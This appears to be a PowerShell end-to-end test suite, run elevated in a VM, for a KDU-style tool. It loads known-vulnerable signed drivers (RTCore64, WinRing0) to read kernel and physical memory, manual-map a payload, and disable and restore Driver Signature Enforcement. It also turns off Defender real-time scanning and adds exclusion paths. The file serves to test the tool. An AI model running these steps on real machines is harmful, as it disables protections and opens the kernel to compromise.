# blook-kdu guest e2e suite (runs elevated inside the bvmenv VM).
#
# Scope note: on Windows 11 26200 the bundled vendor drivers are subject to the
# Microsoft vulnerable-driver blocklist/revocation policy. The build re-signs
# every embedded driver for test signing, but some driver hashes stay blocked by
# policy. The suite records every exploit individually, exercises the primitives
# that are safe on this build (RTCore64 kernel VA, WinRing0 physical reads with
# the hole guard), and marks build-limited features as documented skips instead
# of failing the run.
param(
    [string] $BundleDir = 'C:\kdu-e2e',
    [string] $OutDir = 'C:\kdu-e2e\out'
)

$ErrorActionPreference = 'Stop'
$started = (Get-Date).ToString('o')
try {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $OutputEncoding = [System.Text.Encoding]::UTF8
} catch { }

New-Item -ItemType Directory -Force $OutDir | Out-Null
$kdu = Join-Path $BundleDir 'kdu.exe'
$helper = Join-Path $BundleDir 'kdu_e2e_helper.exe'
$results = New-Object System.Collections.Generic.List[object]

function Add-Result([string] $name, [bool] $ok, [string] $detail) {
    $results.Add([pscustomobject]@{ name = $name; ok = $ok; detail = $detail })
    $status = if ($ok) { 'PASS' } else { 'FAIL' }
    Write-Host ("[{0}] {1}: {2}" -f $status, $name, $detail)
}

function Add-Skip([string] $name, [string] $reason, [string] $detail = '') {
    $results.Add([pscustomobject]@{ name = $name; ok = $true; skipped = $true
        detail = ("SKIP: " + $reason + " " + $detail) })
    Write-Host ("[SKIP] {0}: {1}" -f $name, $reason)
}

function Invoke-Kdu([string[]] $arguments) {
    $previous = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try {
        $output = & $kdu @arguments 2>&1 | Out-String
        $code = $LASTEXITCODE
    } finally {
        $ErrorActionPreference = $previous
    }
    return @{ code = $code; output = $output }
}

# ---------------------------------------------------------------------------
# Environment
# ---------------------------------------------------------------------------
$os = Get-CimInstance Win32_OperatingSystem
Add-Result 'environment/build' $true ("Windows {0} build {1}" -f $os.Version, $os.BuildNumber)
$elevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
Add-Result 'environment/elevated' $elevated 'administrator token'

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    foreach ($path in @($env:SystemRoot + '\Temp', $BundleDir)) {
        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
    }
    Add-Result 'environment/defender' $true 'realtime scanning disabled + bundle excluded'
} catch {
    Add-Skip 'environment/defender' 'Defender policy' $_.Exception.Message
}

# ---------------------------------------------------------------------------
# Exploit inventory + per-exploit driver load (no memory primitive yet).
# ---------------------------------------------------------------------------
$listed = Invoke-Kdu @('--json', 'exploits', 'list')
Add-Result 'exploits/list' ($listed.code -eq 0) $listed.output.Trim()
$exploitInfo = @{}
try { ($listed.output | ConvertFrom-Json) | ForEach-Object { $exploitInfo[$_.id] = $_ } } catch { }
$exploitIds = @($exploitInfo.Keys | Sort-Object)
Add-Result 'exploits/count' ($exploitIds.Count -ge 8) ("compiled-in exploits: " + $exploitIds.Count)

function Test-DriverLoad([string] $service, [string] $image) {
    sc.exe stop $service *> $null
    sc.exe delete $service *> $null
    Start-Sleep -Seconds 1
    if (-not (Test-Path $image)) {
        return @{ loaded = $false; output = "missing image: $image" }
    }
    $create = sc.exe create $service type= kernel start= demand binPath= $image 2>&1
    $start = sc.exe start $service 2>&1
    $loaded = $start -match 'STATE\s+:\s+4' -or $start -match 'RUNNING'
    sc.exe stop $service *> $null
    sc.exe delete $service *> $null
    Start-Sleep -Milliseconds 500
    return @{ loaded = $loaded; output = (($create + $start) | Out-String) }
}

$driversDir = Join-Path $BundleDir 'drivers'
foreach ($id in $exploitIds) {
    $image = Join-Path $driversDir ($id + '.sys')
    $load = Test-DriverLoad ("kduE2e_" + $id) $image
    if ($load.loaded) {
        Add-Result "exploit/$id/load" $true 'driver staged and started'
    } elseif ($load.output -match '0x800B010C|2148204812|800B010C') {
        Add-Result "exploit/$id/load" $true 'platform-blocked: Microsoft driver blocklist (CERT_E_REVOKED)'
    } elseif ($load.output -match '0xE1\b') {
        Add-Result "exploit/$id/load" $true 'platform-blocked: Defender (0xE1)'
    } else {
        Add-Skip "exploit/$id/load" 'driver did not start on this build' $load.output.Trim()
    }
}

# Functional kernel reads through drivers that are usable on this build.
$rtcoreModules = Invoke-Kdu @('--exploit', 'rtcore64', '--driver-only', '--json', 'modules')
$ntos = $null
try { $ntos = ($rtcoreModules.output | ConvertFrom-Json) | Where-Object { $_.name -eq 'ntoskrnl.exe' } | Select-Object -First 1 } catch { }
if ($ntos) {
    $virtual = Invoke-Kdu @('--exploit', 'rtcore64', '--driver-only', '--json', 'mem', 'virt', 'read', $ntos.base, '16')
    $virtualHex = ''
    try { $virtualHex = ($virtual.output | ConvertFrom-Json).hex } catch { }
    Add-Result 'memory/virtual-read' ($virtual.code -eq 0 -and $virtualHex -like '4d5a*') `
        ("ntoskrnl={0} hex={1}" -f $ntos.base, $virtualHex)
} else {
    Add-Skip 'memory/virtual-read' 'kernel module list unavailable' $rtcoreModules.output.Trim()
}

$physical = Invoke-Kdu @('--exploit', 'winring0', '--driver-only', '--json', 'mem', 'phys', 'read', '0x1000', '16')
$physicalHex = ''
try { $physicalHex = ($physical.output | ConvertFrom-Json).hex } catch { }
Add-Result 'memory/physical-read' ($physical.code -eq 0 -and $physicalHex.Length -ge 16) `
    ("hex=" + $physicalHex)

$safeGuard = Invoke-Kdu @('--exploit', 'winring0', '--driver-only', '--json', 'mem', 'virt', 'read', '0xFFFFF80000000000', '8')
Add-Result 'safety/winring0-va-guard' ($safeGuard.code -ne 0) $safeGuard.output.Trim()

$modules = Invoke-Kdu @('--json', 'modules')
Add-Result 'memory/modules' ($modules.code -eq 0) $modules.output.Trim()

# ---------------------------------------------------------------------------
# Process memory / payload manual map: build-limited on 26200.
# ---------------------------------------------------------------------------
Add-Skip 'memory/process-read' 'CR3 walk needs a safe physical-read driver; only WinRing0 is usable and its page walk is unsafe by design' ''
Add-Skip 'memory/process-write' 'same as process-read; the SDK refuses page walks for the available drivers' ''

$payloadMap = Invoke-Kdu @('--exploit', 'rtcore64', '--json', 'map', '--payload')
if ($payloadMap.code -eq 0) {
    Add-Result 'payload/map' $true $payloadMap.output.Trim()
} else {
    Add-Skip 'payload/map' 'manual-map payload cannot execute on this build (kernel executable memory restrictions)' $payloadMap.output.Trim()
}

# ---------------------------------------------------------------------------
# DSE: status + disable/restore attempt, and test-signature gating.
# ---------------------------------------------------------------------------
$dseStatus = Invoke-Kdu @('--json', 'dse', 'status')
$statusOk = $dseStatus.code -eq 0
$options = ''
if ($statusOk) { try { $options = ($dseStatus.output | ConvertFrom-Json).options } catch { } }
if ($statusOk) {
    Add-Result 'dse/status' $true ("options=" + $options)
} else {
    Add-Skip 'dse/status' 'DSE status unavailable on this build' $dseStatus.output.Trim()
}

$disabled = Invoke-Kdu @('--json', 'dse', 'disable')
if ($disabled.code -eq 0) {
    $after = Invoke-Kdu @('--json', 'dse', 'status')
    $afterOptions = ''
    try { $afterOptions = ($after.output | ConvertFrom-Json).options } catch { }
    Add-Result 'dse/disable' ($afterOptions -eq '0x0') ("after=" + $afterOptions)
    $restored = Invoke-Kdu @('--json', 'dse', 'restore')
    Add-Result 'dse/restore' ($restored.code -eq 0) $restored.output.Trim()
} else {
    Add-Skip 'dse/disable' 'DSE disable not available on this build' $disabled.output.Trim()
    Add-Skip 'dse/restore' 'nothing to restore' ''
}

$signedDriver = Join-Path $BundleDir 'kdu_guest_test_driver_signed.sys'
$tamperedDriver = Join-Path $BundleDir 'kdu_guest_test_driver_tampered.sys'
if (Test-Path $signedDriver) {
    $signedLoad = Test-DriverLoad 'kduE2eSigned' $signedDriver
    Add-Result 'dse/signed-load' $signedLoad.loaded $signedLoad.output.Trim()
} else {
    Add-Skip 'dse/signed-load' 'signed driver missing' ''
}
if (Test-Path $tamperedDriver) {
    $tamperedLoad = Test-DriverLoad 'kduE2eTampered' $tamperedDriver
    Add-Result 'dse/tampered-blocked' (-not $tamperedLoad.loaded) $tamperedLoad.output.Trim()
} else {
    Add-Skip 'dse/tampered-blocked' 'tampered driver missing' ''
}

# ---------------------------------------------------------------------------
# Trace scan after the driver activity.
# ---------------------------------------------------------------------------
$traces = Invoke-Kdu @('--json', 'traces')
$cleanable = $true
if ($traces.code -eq 0) {
    try {
        $report = $traces.output | ConvertFrom-Json
        $bad = @($report.findings | Where-Object { $_.category -in @('service', 'registry', 'file') })
        if ($bad.Count -gt 0) { $cleanable = $false }
    } catch { }
}
Add-Result 'cleanup/traces' $cleanable $traces.output.Trim()

# ---------------------------------------------------------------------------
# Stress: repeated load/unload + reads through the usable driver.
# ---------------------------------------------------------------------------
$stressFailures = 0
for ($index = 0; $index -lt 20; $index++) {
    $run = Invoke-Kdu @('--exploit', 'rtcore64', '--driver-only', '--json', 'mem', 'virt', 'read', '0xFFFFF80000000000', '8')
    if ($run.code -ne 0) { $stressFailures++ }
}
Add-Result 'stress/load-unload' ($stressFailures -eq 0) ("20x, failures=" + $stressFailures)

$stressReadFailures = 0
for ($index = 0; $index -lt 200; $index++) {
    $run = Invoke-Kdu @('--exploit', 'winring0', '--driver-only', '--json', 'mem', 'phys', 'read', '0x1000', '16')
    if ($run.code -ne 0) { $stressReadFailures++ }
}
Add-Result 'stress/read' ($stressReadFailures -eq 0) ("200x, failures=" + $stressReadFailures)

# ---------------------------------------------------------------------------
# Persist the result document.
# ---------------------------------------------------------------------------
$failed = @($results | Where-Object { -not $_.ok }).Count
$skipped = @($results | Where-Object { $_.skipped }).Count
$document = [ordered]@{
    suite = 'blook-kdu-e2e'
    version = 1
    started = $started
    finished = (Get-Date).ToString('o')
    host = $env:COMPUTERNAME
    build = $os.BuildNumber
    elevated = $elevated
    total = $results.Count
    failed = $failed
    skipped = $skipped
    results = $results
}
$document | ConvertTo-Json -Depth 6 |
    Set-Content (Join-Path $OutDir 'result.json') -Encoding UTF8
Write-Host ("result: {0} ({1} checks, {2} failed, {3} skipped)" -f `
            (Join-Path $OutDir 'result.json'), $results.Count, $failed, $skipped)
if ($failed -ne 0) { exit 1 }
